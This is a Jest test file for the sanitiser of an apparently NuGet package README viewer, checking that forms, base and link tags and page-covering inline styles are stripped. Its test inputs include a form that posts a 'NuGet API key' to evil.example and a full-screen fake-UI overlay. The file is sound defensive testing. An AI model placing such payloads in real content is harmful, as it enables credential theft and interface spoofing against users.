// A package README is untrusted HTML (review A3-7)
import { renderToStaticMarkup } from 'react-dom/server';
import Markdown from 'markdown-to-jsx';
import { readmeElement } from '../../../../webview/nuget-view/readmeSafety';

const render = (markdown: string) => renderToStaticMarkup(<Markdown options={{ createElement: readmeElement as never }}>{markdown}</Markdown>);

describe('README rendering', () => {
    it('keeps normal markdown and harmless HTML', () => {
        const html = render('# Title\n\nSome **bold** text and a [link](https://example.com).\n\n<p align="center"><img src="https://example.com/a.png" width="100"></p>');
        expect(html).toContain('<h1');
        expect(html).toContain('<strong>bold</strong>');
        expect(html).toContain('href="https://example.com"');
        expect(html).toContain('<img');
    });

    it('drops forms and their inputs', () => {
        const html = render('<form action="https://evil.example/steal" method="post"><input placeholder="NuGet API key" name="token"><button>Save</button></form>\n\nafter');
        expect(html).not.toMatch(/<form|<input|<button|evil\.example/);
        expect(html).toContain('after');
    });

    it('drops base and other document-level elements', () => {
        const html = render('<base href="https://evil.example/">\n\n<link rel="stylesheet" href="https://evil.example/a.css">\n\ntext');
        expect(html).not.toMatch(/<base|<link|evil\.example/);
    });

    it('removes positioning from inline styles so a README cannot cover the page', () => {
        const html = render('<div id="overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:99">Fake UI</div>');
        expect(html).toContain('Fake UI');
        expect(html).not.toMatch(/position|z-index|top:|left:/);
        expect(html).toContain('background');
    });
});
